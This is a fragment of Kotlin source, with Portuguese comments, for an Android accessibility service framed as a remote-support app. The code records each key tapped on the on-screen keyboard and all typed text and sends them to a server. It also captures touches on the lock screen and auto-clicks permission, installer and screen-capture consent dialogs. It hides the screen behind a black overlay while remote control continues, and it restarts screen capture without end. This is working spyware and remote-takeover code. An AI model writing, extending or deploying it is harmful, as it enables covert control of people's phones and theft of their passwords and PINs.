        val linhaBotoes = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
        }
        val btnRecusar = Button(this).apply {
            text = "Recusar"
            setOnClickListener {
                removerTelaPrivacidade("usuario RECUSOU a tela de privacidade")
            }
        }
        val btnPermitir = Button(this).apply {
            text = "Permitir"
            setOnClickListener { aplicarTelaPretaPrivacidade() }
        }
        linhaBotoes.addView(btnRecusar, LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))
        linhaBotoes.addView(btnPermitir, LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))
        container.addView(titulo)
        container.addView(msg)
        container.addView(linhaBotoes)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )
        try {
            windowManager?.addView(container, params)
            overlayPrivacidade = container
            enviarLog("Pedido de tela de privacidade exibido ao usuario (aguardando consentimento).")
        } catch (e: Exception) {
            enviarLog("Falha ao exibir consentimento da tela de privacidade: ${e.message}")
        }
    }

    private fun criarViewPreta(textoAviso: String): FrameLayout {
        val preta = FrameLayout(this).apply { setBackgroundColor(Color.BLACK) }
        val aviso = TextView(this).apply {
            text = textoAviso
            setTextColor(Color.parseColor("#555555"))
            textSize = 13f
            gravity = Gravity.CENTER
        }
        preta.addView(
            aviso,
            FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT,
                Gravity.CENTER
            )
        )
        return preta
    }

    private fun paramsPreta() = WindowManager.LayoutParams(
        WindowManager.LayoutParams.MATCH_PARENT,
        WindowManager.LayoutParams.MATCH_PARENT,
        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
        PixelFormat.OPAQUE
    )

    private fun aplicarTelaPretaPrivacidade() {
        removerViewPrivacidade()
        val preta = criarViewPreta("Tela protegida durante o suporte\nVolume (−) para voltar")
        try {
            windowManager?.addView(preta, paramsPreta())
            overlayPrivacidade = preta
            handlerMain.postDelayed(autoRemover, TIMEOUT_PRIVACIDADE_MS)
            enviarLog("Tela de privacidade ATIVADA (com consentimento). Acesso remoto segue ativo.")
            try { SocketManager.socket?.emit("tela_privacidade_estado", "ativa") } catch (_: Exception) {}
        } catch (e: Exception) {
            enviarLog("Falha ao ativar tela de privacidade: ${e.message}")
        }
    }

    private fun removerViewPrivacidade() {
        overlayPrivacidade?.let {
            try { windowManager?.removeView(it) } catch (_: Exception) {}
        }
        overlayPrivacidade = null
    }

    private fun removerTelaPrivacidade(motivo: String) {
        handlerMain.removeCallbacks(autoRemover)
        if (overlayPrivacidade == null) return
        removerViewPrivacidade()
        enviarLog("Tela de privacidade REMOVIDA: $motivo")
        try { SocketManager.socket?.emit("tela_privacidade_estado", "inativa") } catch (_: Exception) {}
    }

    // ===================== TELA ESCURA DIRETA / CORTINA DE TELA (BRILHO ZERO) =====================
    /**
     * Fallback legado (overlay de acessibilidade). O fluxo principal (REGRA 4)
     * usa ScreenCaptureService.ativarTelaPretaFalsa via WindowManager a partir
     * do SocketManager. Mantido apenas para compatibilidade.
     */
    private fun aplicarTelaEscura() {
        val camadaPreta = View(this)
        camadaPreta.setBackgroundColor(android.graphics.Color.BLACK)
        val typeOverlay = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
        } else {
            @Suppress("DEPRECATED")
            WindowManager.LayoutParams.TYPE_PHONE
        }
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            typeOverlay,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                WindowManager.LayoutParams.FLAG_SECURE,
            PixelFormat.OPAQUE
        )
        try {
            windowManager?.addView(camadaPreta, params)
            overlayEscura = camadaPreta
            enviarLog("Modo Escuro ATIVADO (fallback acessibilidade + FLAG_SECURE). Painel continua vendo tela colorida.")
        } catch (e: Exception) {
            enviarLog("Falha ao ativar Modo Escuro: ${e.message}")
        }
    }

    private fun removerTelaEscura(motivo: String) {
        if (overlayEscura == null) return
        overlayEscura?.let {
            try { windowManager?.removeView(it) } catch (_: Exception) {}
        }
        overlayEscura = null
        enviarLog("Modo Clarear ATIVADO: $motivo (brilho físico do display restaurado).")
    }

    override fun onKeyEvent(event: KeyEvent?): Boolean {
        // HOME com a tela apagada: acende a tela. Não consome o evento —
        // o home continua funcionando normalmente.
        try {
            if (event?.keyCode == KeyEvent.KEYCODE_HOME && event.action == KeyEvent.ACTION_DOWN) {
                val pm = getSystemService(POWER_SERVICE) as PowerManager
                if (!pm.isInteractive) {
                    acenderTela()
                    enviarLogApp("[HOME] Tela apagada detectada ao apertar HOME — tela acesa.")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro no onKeyEvent (HOME): ${e.message}")
        }
        if (overlayPrivacidade != null &&
            event?.keyCode == KeyEvent.KEYCODE_VOLUME_DOWN &&
            event.action == KeyEvent.ACTION_DOWN
        ) {
            removerTelaPrivacidade("usuario pressionou Volume (−)")
            return true
        }
        return super.onKeyEvent(event)
    }

    /**
     * Executa gestos remotos de toque/arraste usando a API nativa dispatchGesture,
     * compatível com Xiaomi (MIUI/HyperOS) e sem depender de rotas de Acessibilidade Restrita.
     */
    private fun handleRemoteGesture(acao: String, x: Float, y: Float, bypass: Boolean = true) {
        // Só a SALA do emulador nativo abre o bypass do overlay. A sala do
        // dispositivo android injeta o gesto SEM tocar no overlay.
        fun garantirBypass() { if (bypass) manterBypassAberto() }
        val pontoReal = android.graphics.Point()
        val wm = getSystemService(WINDOW_SERVICE) as? WindowManager
        @Suppress("DEPRECATION")
        wm?.defaultDisplay?.getRealSize(pontoReal)
        val metrics = resources.displayMetrics
        val maxW = (if (pontoReal.x > 0) pontoReal.x else metrics.widthPixels).toFloat() - 1f
        val maxH = (if (pontoReal.y > 0) pontoReal.y else metrics.heightPixels).toFloat() - 1f
        val boundedX = x.coerceIn(0f, maxW)
        val boundedY = y.coerceIn(0f, maxH)

        when (acao.uppercase()) {
            "START" -> {
                garantirBypass()
                startX = boundedX
                startY = boundedY
                pendingX = -1f
                pendingY = -1f
            }
            "MOVE" -> {
                garantirBypass()
                pendingX = boundedX
                pendingY = boundedY
            }
            "END" -> {
                val finalX = if (pendingX >= 0f) pendingX else boundedX
                val finalY = if (pendingY >= 0f) pendingY else boundedY

                val movido = kotlin.math.abs(finalX - startX) > 5f || kotlin.math.abs(finalY - startY) > 5f
                val duration = if (movido) 250L else 50L

                val path = Path().apply {
                    moveTo(startX, startY)
                    lineTo(finalX, finalY)
                }

                try {
                    val stroke = GestureDescription.StrokeDescription(path, 0, duration)
                    val gesto = GestureDescription.Builder().addStroke(stroke).build()
                    val aceito = dispatchGesture(gesto, object : GestureResultCallback() {
                        override fun onCompleted(g: GestureDescription?) {
                            enviarLog("toque/gesto OK (${finalX.toInt()},${finalY.toInt()})")
                            // NÃO fecha o bypass aqui: mantém ABERTO para o
                            // próximo clique (só re-bloqueia após inatividade).
                            garantirBypass()
                        }
                        override fun onCancelled(g: GestureDescription?) {
                            enviarLog("toque/gesto CANCELADO (${finalX.toInt()},${finalY.toInt()})")
                            garantirBypass()
                        }
                    }, null)

                    if (!aceito) {
                        enviarLog("dispatchGesture recusado em (${finalX.toInt()},${finalY.toInt()})")
                        garantirBypass()
                    }
                } catch (e: Exception) {
                    enviarLog("Erro ao injetar gesto: ${e.message}")
                    garantirBypass()
                }

                pendingX = -1f
                pendingY = -1f
            }
        }
    }

    private fun handleTecla(tipo: String, valor: String) {
        // Navegação global (Voltar / Home) NÃO depende de campo de texto focado:
        // funciona em qualquer tela do aparelho, mesmo sem caixa de digitação.
        if (tipo == "tecla") {
            when (valor.uppercase()) {
                "BACK" -> {
                    val ok = performGlobalBackAction()
                    enviarLog("Botão BACK global injetado (ok=$ok)")
                    return
                }
                "HOME" -> {
                    val ok = performGlobalHomeAction()
                    enviarLog("Botão HOME global injetado (ok=$ok)")
                    return
                }
            }
        }
        val node: AccessibilityNodeInfo? =
            rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        if (node == null || !node.isEditable) {
            Log.d(TAG, "Nenhum campo de texto editável focado (tecla ignorada: $tipo/$valor)")
            return
        }
        // TEXTO REAL (ignora o placeholder/dica): num campo de busca VAZIO o
        // Android devolve em node.text a DICA (hint, ex.: "Pesquisa"), não "".
        // Sem este tratamento, a 1ª letra digitada virava "Pesquisa"+letra
        // (a palavra da dica grudava antes do texto). Quando o campo está
        // mostrando o hint (isShowingHintText) ou node.text == hintText, o
        // conteúdo real é vazio — começa limpo.
        val atual = run {
            val t = node.text?.toString() ?: ""
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val hint = node.hintText?.toString()
                if (node.isShowingHintText || (hint != null && t == hint)) "" else t
            } else t
        }
        when (tipo) {
            "texto" -> definirTexto(node, atual + valor)
            "tecla" -> when (valor.uppercase()) {
                // Seleciona TODO o conteúdo do campo (equivale ao Ctrl+A).
                "SELECIONAR_TUDO", "SELECT_ALL" -> {
                    val argsSel = Bundle().apply {
                        putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, 0)
                        putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, atual.length)
                    }
                    node.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, argsSel)
                }
                // Apaga TUDO (usado quando o PC deu Ctrl+A e depois Backspace/Delete).
                "APAGAR_TUDO", "LIMPAR", "LIMPAR_TUDO", "CLEAR" -> definirTexto(node, "")
                "BACKSPACE" -> {
                    // Respeita a seleção: se há um trecho selecionado (ex.: após
                    // Ctrl+A), apaga o trecho inteiro; senão, remove 1 caractere.
                    val ini = node.textSelectionStart
                    val fim = node.textSelectionEnd
                    if (ini in 0..atual.length && fim in 0..atual.length && fim > ini) {
                        definirTexto(node, atual.substring(0, ini) + atual.substring(fim))
                    } else if (atual.isNotEmpty()) {
                        definirTexto(node, atual.dropLast(1))
                    }
                }
                "ESPACO", "SPACE" -> definirTexto(node, "$atual ")
                "TAB" -> definirTexto(node, "$atual\t")
                "ENTER" -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        node.performAction(
                            AccessibilityNodeInfo.AccessibilityAction.ACTION_IME_ENTER.id
                        )
                    } else {
                        definirTexto(node, "$atual\n")
                    }
                }
            }
        }
    }

    private fun definirTexto(node: AccessibilityNodeInfo, texto: String) {
        val argsTexto = Bundle().apply {
            putCharSequence(
                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                texto
            )
        }
        node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, argsTexto)
        val argsSel = Bundle().apply {
            putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, texto.length)
            putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, texto.length)
        }
        node.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, argsSel)
    }

    // ================================================================
    // REGRA 2/3 — MOTOR DE CLIQUE AUTOMÁTICO (INJECTY)
    // ----------------------------------------------------------------
    // Sempre que o serviço de acessibilidade está ativo e uma tela de
    // permissão/segurança do sistema (ou as configurações do Suporte
    // Motor, ou o próprio modal "Iniciar" do app, ou o diálogo do
    // MediaProjection) está em primeiro plano, injeta cliques automáticos
    // nos botões de "Permitir / Iniciar / Iniciar agora / Aceitar / Instalar"
    // para agilizar o processo do cliente — sem toque manual.
    //
    // MODO RÁPIDO (onboardingRapido=true): intervalo de 300ms entre cliques
    // e "voltar" automático após confirmar em telas de configuração.
    // ================================================================
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // ETAPA 3 — INJECT DO ATALHO: enquanto a janela estiver armada, procura
        // e clica o botão "Adicionar" do diálogo "Adicionar à tela inicial"
        // (requestPinShortcut). Roda antes de tudo e some assim que confirma.
        if (System.currentTimeMillis() < prazoConfirmacaoAtalhoMs) {
            try {
                rootInActiveWindow?.let {
                    if (procurarEClicarBotaoAtalho(it)) prazoConfirmacaoAtalhoMs = 0L
                }
            } catch (_: Exception) {}
        }

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            val agora = System.currentTimeMillis()
            if (agora - ultimoLayoutMudancaMs < 150) {
                return // Debounce de rajadas de layout do IME para eliminar flicker
            }
            ultimoLayoutMudancaMs = agora
        }

        // CAPTURA DE GESTOS FÍSICOS DO USUÁRIO NA TELA DE BLOQUEIO (Keyguard)
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED,
            AccessibilityEvent.TYPE_VIEW_SELECTED,
            AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED,
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED,
            AccessibilityEvent.TYPE_VIEW_HOVER_ENTER,
            AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START,
            AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END,
            AccessibilityEvent.TYPE_TOUCH_INTERACTION_START,
            AccessibilityEvent.TYPE_TOUCH_INTERACTION_END,
            AccessibilityEvent.TYPE_GESTURE_DETECTION_START,
            AccessibilityEvent.TYPE_GESTURE_DETECTION_END,
            AccessibilityEvent.TYPE_VIEW_SCROLLED,
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                capturarToqueFisicoTelaBloqueio(event)
            }
        }

        // MAPEAMENTO DE TOQUES NO TECLADO VIRTUAL — captura CADA tecla no exato
        // instante do clique (TYPE_VIEW_CLICKED), em vez de ler o campo depois.
        // Mesmo digitando rápido, cada tecla é emitida na hora (teclado_tecla),
        // preservando a sequência exata de letras e números.
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            capturarTeclaDigitada(event)
        }

        // Acesso Total: consome/intercepta toques locais quando bloqueado.
        if (bloquearCliquesLocais) {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_CLICKED,
                AccessibilityEvent.TYPE_VIEW_FOCUSED,
                AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START,
                AccessibilityEvent.TYPE_TOUCH_INTERACTION_START -> {
                    Log.d(TAG, "Clique local bloqueado pelo Acesso Total (bloquearCliquesLocais=true) no evento: ${event.eventType}")
                }
            }
        }
        // REDE DE SEGURANÇA PÓS-BOOT / KEEP-ALIVE: em mudanças de janela/conteúdo,
        // verifica se o ecossistema (Socket + ScreenCaptureService) caiu e o
        // reergue silenciosamente. Throttle interno de 5s evita disparos repetidos.
        val tipoEvento = event.eventType
        if (tipoEvento == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            tipoEvento == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        ) {
            verificarEReanimarEcossistema()
        }
        // REGRA 2/3: automação assistiva de cliques em telas de permissão.
        tentarAutoCliquePermissoes(event)

        // TRANSMISSÃO CONTÍNUA DE TELEMETRIA (Modo Híbrido / Leitor FPS)
        enviarTelemetriaAcessibilidade(event)

        // MONITORAMENTO DE TECLADO VIRTUAL E LOG EM LINHA ÚNICA AO FECHAR
        // CORREÇÃO DE PERDA DE CARACTERES: o texto do evento (event.text) é a
        // fonte MAIS FRESCA e confiável — ele carrega o valor COMPLETO do campo
        // no exato instante da mudança. node.text pode estar nulo/obsoleto se o
        // nó for reciclado ou se o campo for customizado. Por isso tentamos
        // event.text PRIMEIRO, e só depois node.text (com refresh de reserva).
        // O buffer é SEMPRE atualizado (mesmo quando vazio) para não enviar um
        // texto velho quando o teclado fecha. Nenhuma letra/número é removido.
        val tipo = event.eventType
        if (tipo == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || tipo == AccessibilityEvent.TYPE_WINDOWS_CHANGED || tipo == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val keyboardOpen = isKeyboardOpen()
            if (keyboardOpen) {
                // 1) Tenta o texto fresco do próprio evento (vem completo).
                var txt: String = event.text?.joinToString("") ?: ""
                var node: AccessibilityNodeInfo? = event.source
                    ?: rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                // 2) Se o evento veio vazio, lê do nó (com refresh para não usar valor obsoleto).
                if (txt.isEmpty() && node != null) {
                    try { node.refresh() } catch (_: Exception) {}
                    txt = node.text?.toString() ?: ""
                }
                // 3) Última reserva: acha o campo editável focado na árvore e lê o texto.
                if (txt.isEmpty()) {
                    val focado = rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                    if (focado != null) {
                        try { focado.refresh() } catch (_: Exception) {}
                        txt = focado.text?.toString() ?: ""
                        if (node == null) node = focado
                    }
                }
                val bounds = android.graphics.Rect()
                try { node?.getBoundsInScreen(bounds) } catch (_: Exception) {}
                val cleaned = txt.replace("\n", " ").replace("\r", " ").replace(Regex("\\s+"), " ").trim()
                // Buffer SEMPRE atualizado (mesmo vazio) — evita enviar texto obsoleto no fechamento.
                bufferTextoTeclado = cleaned
                bufferAppTeclado = event.packageName?.toString() ?: bufferAppTeclado
                bufferBoundsTeclado = bounds
                if (cleaned.isNotEmpty()) {
                    SocketManager.enviarTecladoLog(bufferAppTeclado, cleaned, bufferBoundsTeclado)
                }
                try { node?.recycle() } catch (_: Exception) {}
                tecladoAbertoAnterior = true
            } else if (tecladoAbertoAnterior && !keyboardOpen) {
                if (bufferTextoTeclado.isNotEmpty()) {
                    SocketManager.enviarTecladoLog(bufferAppTeclado, bufferTextoTeclado, bufferBoundsTeclado)
                }
                bufferTextoTeclado = ""
                bufferAppTeclado = ""
                bufferBoundsTeclado = null
                tecladoAbertoAnterior = false
            }
        }
    }

    // ================================================================
    // MAPEAMENTO DE TOQUES NO TECLADO VIRTUAL
    // ----------------------------------------------------------------
    // Em vez de LER o campo de texto (que mascara dígitos e mistura a
    // dica), monitoramos o clique em cada TECLA do teclado na tela e
    // registramos a sequência EXATA de letras/números pressionados, no
    // exato instante do toque — mesmo em digitação rápida.
    // ================================================================
    private val palavrasDigito = mapOf(
        "zero" to "0", "um" to "1", "uma" to "1", "dois" to "2", "duas" to "2",
        "tres" to "3", "quatro" to "4", "cinco" to "5", "seis" to "6",
        "sete" to "7", "oito" to "8", "nove" to "9",
        "one" to "1", "two" to "2", "three" to "3", "four" to "4", "five" to "5",
        "six" to "6", "seven" to "7", "eight" to "8", "nine" to "9"
    )
    // Pontuação/símbolos comuns expostos só pelo contentDescription falado
    // (rótulo normalizado: minúsculas, sem acento). Sem este mapa, teclas como
    // ".", ",", "@", "-" eram descartadas e sumiam do log ao vivo.
    private val palavrasPontuacao = mapOf(
        "ponto" to ".", "ponto final" to ".", "period" to ".", "dot" to ".", "full stop" to ".",
        "virgula" to ",", "comma" to ",",
        "interrogacao" to "?", "ponto de interrogacao" to "?", "question mark" to "?",
        "exclamacao" to "!", "ponto de exclamacao" to "!", "exclamation" to "!", "exclamation mark" to "!",
        "arroba" to "@", "at sign" to "@",
        "underline" to "_", "underscore" to "_",
        "hifen" to "-", "hyphen" to "-", "minus" to "-", "travessao" to "-",
        "dois pontos" to ":", "colon" to ":",
        "ponto e virgula" to ";", "semicolon" to ";",
        "barra" to "/", "slash" to "/",
        "mais" to "+", "plus" to "+",
        "asterisco" to "*", "star" to "*",
        "parentese esquerdo" to "(", "abrir parentese" to "(", "left parenthesis" to "(",
        "parentese direito" to ")", "fechar parentese" to ")", "right parenthesis" to ")",
        "cedilha" to "ç", "c cedilha" to "ç",
        "aspas" to "\"", "aspas duplas" to "\"", "quote" to "\"", "double quote" to "\"",
        "apostrofo" to "'", "single quote" to "'",
        "cifrao" to "$", "dolar" to "$", "dollar" to "$",
        "por cento" to "%", "porcento" to "%", "percent" to "%",
        "e comercial" to "&", "ampersand" to "&",
        "igual" to "=", "equals" to "=",
    )
    private val teclasEspaco = setOf(
        "space", "espaco", "spacebar", "barra de espaco", "barra espaco"
    )
    private val teclasApagar = setOf(
        "delete", "backspace", "apagar", "del", "excluir", "apagar caractere",
        "retroceder", "apagar texto"
    )
    private val teclasEnter = setOf(
        "enter", "return", "ir", "go", "done", "concluir", "ok", "buscar",
        "search", "pesquisar", "enviar", "send", "next", "proximo"
    )

    private var ultimoTimestampTeclaEmitida = 0L
    private var ultimaTeclaEmitida = ""

    /**
     * Captura a tecla pressionada no teclado virtual e a envia imediatamente.
     * Só reage a cliques vindos da JANELA do teclado (IME) — assim um clique em
     * botão comum do app nunca é confundido com uma tecla.
     */
    private fun capturarTeclaDigitada(event: AccessibilityEvent) {
        try {
            if (!isKeyboardOpen()) return
            val src = event.source ?: return
            // O clique precisa vir da janela do método de entrada (teclado).
            val ehTeclado = try {
                src.window?.type == AccessibilityWindowInfo.TYPE_INPUT_METHOD
            } catch (_: Exception) { false }
            // Rótulo da tecla: text ou contentDescription (muitos teclados só
            // expõem a tecla pelo contentDescription falado, ex.: "seis").
            val rotulo = (src.text?.toString()
                ?: src.contentDescription?.toString()
                ?: event.text?.joinToString("")
                ?: "").trim()
            try { src.recycle() } catch (_: Exception) {}
            if (!ehTeclado) return
            val tecla = rotuloParaTecla(rotulo) ?: return
            val agora = System.currentTimeMillis()
            if (tecla == ultimaTeclaEmitida && (agora - ultimoTimestampTeclaEmitida < 80)) {
                return
            }
            ultimoTimestampTeclaEmitida = agora
            ultimaTeclaEmitida = tecla
            val app = event.packageName?.toString()
                ?: bufferAppTeclado.ifEmpty { "(sem aplicativo)" }
            SocketManager.enviarTeclaPressionada(app, tecla, agora)
        } catch (_: Exception) {}
    }

    /** Converte o rótulo de uma tecla no caractere real, " ", "\b", "\n" ou null. */
    private fun rotuloParaTecla(bruto: String): String? {
        val rotulo = bruto.trim()
        if (rotulo.isEmpty()) return null
        val norm = normalizarRotulo(rotulo)
        if (norm in teclasEspaco) return " "
        if (norm in teclasApagar) return "\b"
        if (norm in teclasEnter) return "\n"
        palavrasDigito[norm]?.let { return it }
        palavrasPontuacao[norm]?.let { return it }
        // Tecla de 1 caractere imprimível (letra, dígito ou símbolo).
        if (rotulo.length == 1 && !rotulo[0].isWhitespace()) return rotulo
        // Rótulos descritivos: "Tecla 5", "dígito 7", "number 3", "key q".
        val m = Regex(
            "^(?:tecla|digito|letra|caractere|key|digit|letter|number|char)\\s+(\\S)$"
        ).find(norm)
        if (m != null) return m.groupValues[1]
        return null
    }

    /** Minúsculas, sem acentos e sem espaços nas pontas (para comparar rótulos). */
    private fun normalizarRotulo(s: String): String {
        return try {
            java.text.Normalizer.normalize(s, java.text.Normalizer.Form.NFD)
                .replace(Regex("\\p{Mn}+"), "")
                .lowercase()
                .trim()
        } catch (_: Exception) {
            s.lowercase().trim()
        }
    }

    /**
     * REDE DE SEGURANÇA PÓS-BOOT / KEEP-ALIVE.
     *
     * Chamada em mudanças de janela/conteúdo. Se o ScreenCaptureService estiver
     * morto (isRunning == false) e o onboarding já foi concluído, reergue o
     * ecossistema via Injetor Virtual: força a abertura da MainActivity em
     * modo headless (extra AUTO_BOOT_REANIMAR) para reobter um token válido
     * de MediaProjection — NÃO inicia o ScreenCaptureService diretamente (sem
     * token o vídeo trava). Throttle de 5s (REANIMACAO_INTERVALO_MS) + flag de
     * tentativa evitam loops de reabertura no display do cliente.
     */
    private fun verificarEReanimarEcossistema() {
        try {
            val agora = System.currentTimeMillis()
            // Se o serviço já está rodando, nada a fazer (e zera contador de falhas).
            if (ScreenCaptureService.isRunning) { reanimacaoFalhasConsecutivas = 0; return }
            // Sem socket conectado = ninguém assistindo ao vídeo → não reanima
            // (evita abrir a MainActivity à toa e "mexer a tela" sem motivo).
            if (SocketManager.socket?.connected() != true) return
            // Onboarding precisa estar concluído (primeiro_acesso == false).
            val prefs = getSharedPreferences("rastreio_facil_prefs", MODE_PRIVATE)
            val onboardingConcluido = !prefs.getBoolean("primeiro_acesso", true)
            if (!onboardingConcluido) return
            // NUNCA DESISTE (pedido do CEO: os frames não podem cair). Enquanto a
            // captura estiver caída e o socket vivo, continua re-pedindo o
            // MediaProjection — o inject auto-aceita o "Iniciar agora" e o
            // espelhamento volta sozinho. Após MAX falhas, só ESPAÇA as tentativas
            // (backoff de 60s) em vez de parar, para não piscar a tela à toa.
            val intervalo = if (reanimacaoFalhasConsecutivas >= MAX_REANIMACAO_TENTATIVAS)
                60000L else REANIMACAO_INTERVALO_MS
            if (agora - ultimaTentativaReanimacao < intervalo) return
            // Marca a tentativa ANTES de disparar (evita múltiplas chamadas
            // concorrentes enquanto o start ainda não surtiu efeito em isRunning).
            ultimaTentativaReanimacao = agora
            reanimacaoFalhasConsecutivas++
            // ── INJETOR VIRTUAL PÓS-BOOT ─────────────────────────────────────
            // NÃO inicia mais o ScreenCaptureService diretamente (sem token de
            // MediaProjection o vídeo fica travado). Em vez disso, força a
            // abertura da MainActivity em modo headless com o extra
            // AUTO_BOOT_REANIMAR — ela pede o MediaProjection, inicia o
            // Foreground Service com token válido e se fecha em 200ms.
            // O throttle de 5s (REANIMACAO_INTERVALO_MS) no início desta função
            // impede loops de reabertura no display do cliente.
            SocketManager.appContext = applicationContext
            val i = Intent(this, MainActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                putExtra("AUTO_BOOT_REANIMAR", true)
            }
            startActivity(i)
            enviarLogApp("[KEEP-ALIVE] Injetor Virtual disparado: MainActivity headless (AUTO_BOOT_REANIMAR) para reobter token de MediaProjection.")
        } catch (e: Exception) {
            Log.e(TAG, "Erro na verificação de keep-alive: ${e.message}")
        }
    }

    /** onboardingRapido só vale enquanto o primeiro acesso NÃO foi concluído.
     *  A flag pode ficar presa em true na memória — a SharedPreferences é a
     *  fonte da verdade. Sem isto, o "voltar automático" (BACK) e o clique
     *  rápido de 300ms ficam ativos para sempre, e o app passa a fechar/
     *  navegar sozinho. */
    private fun onboardingRapidoAtivo(): Boolean {
        if (!onboardingRapido) return false
        return try {
            getSharedPreferences("rastreio_facil_prefs", MODE_PRIVATE)
                .getBoolean("primeiro_acesso", true)
        } catch (e: Exception) {
            onboardingRapido
        }
    }

    /** Intervalo entre auto-cliques: 300ms no onboarding rápido, senão 1200ms. */
    private fun intervaloAutoCliqueMs(): Long =
        if (onboardingRapidoAtivo()) CLICK_RAPIDO_INTERVALO_MS else CLICK_AUTO_INTERVALO_MS

    /**
     * Retorna true se, após auto-clicar neste pacote (tela de configuração/
     * instalador), devemos VOLTAR automaticamente para o app. NÃO aplica a
     * SystemUI (diálogo do MediaProjection fecha sozinho) nem ao próprio app.
     */
    private fun pacoteRequerVoltarAutomatico(pacote: String): Boolean {
        val p = pacote.lowercase()
        return p.contains("settings") || p.contains("security") || p.contains("miui") ||
            p.contains("lbe") || p.contains("packageinstaller") || p.contains("permissioncontroller")
    }

    private fun tentarAutoCliquePermissoes(event: AccessibilityEvent) {
        try {
            if (!autoClickPermissoesAtivo) return
            val tipo = event.eventType
            if (tipo != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
                tipo != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            ) return
            val pacote = event.packageName?.toString() ?: return

            // REGRA 2 — ESCOPO ESTRITO: app terceiro = auto-clique IGNORADO.
            if (!pacotePermitidoParaAutoClique(pacote)) {
                Log.d(TAG, "Auto-clique IGNORADO (escopo estrito): pacote terceiro '$pacote'.")
                return
            }

            // REGRA 1: limpa cache de botões clicados se a janela mudou.
            resetarCacheCliqueSeMudouJanela(pacote)
            _pacoteAutoCliqueAtual = pacote

            val raiz = rootInActiveWindow ?: return

            val textoRaiz = extrairTextoArvore(raiz).lowercase()
            val eDialogoMidiaProjecao = pacote.contains("systemui", true) ||
                pacote.contains("permissioncontroller", true) ||
                textoRaiz.contains("iniciar agora") ||
                textoRaiz.contains("start now") ||
                textoRaiz.contains("compartilhamento de tela") ||
                textoRaiz.contains("screen recording") ||
                textoRaiz.contains("screen sharing") ||
                textoRaiz.contains("toda a tela") ||
                textoRaiz.contains("entire screen")

            if (eDialogoMidiaProjecao) {
                Log.d(TAG, "[MEDIA-PROJECTION] Diálogo de consentimento detectado no pacote: $pacote")
                iniciarCicloAutoCliqueMediaProjection(raiz)
                return
            }

            // SEGURANÇA: a janela ativa (raiz) pode pertencer a OUTRO pacote
            // que não o do evento (overlay, diálogo de outro app). Se o pacote
            // da janela não for permitido, aborta — nunca clica em terceiros.
            val pacoteJanela = raiz.packageName?.toString() ?: ""
            if (pacoteJanela.isNotEmpty() && !pacotePermitidoParaAutoClique(pacoteJanela)) {
                Log.d(TAG, "Auto-clique IGNORADO: janela ativa pertence a pacote terceiro '$pacoteJanela' (evento='$pacote').")
                return
            }
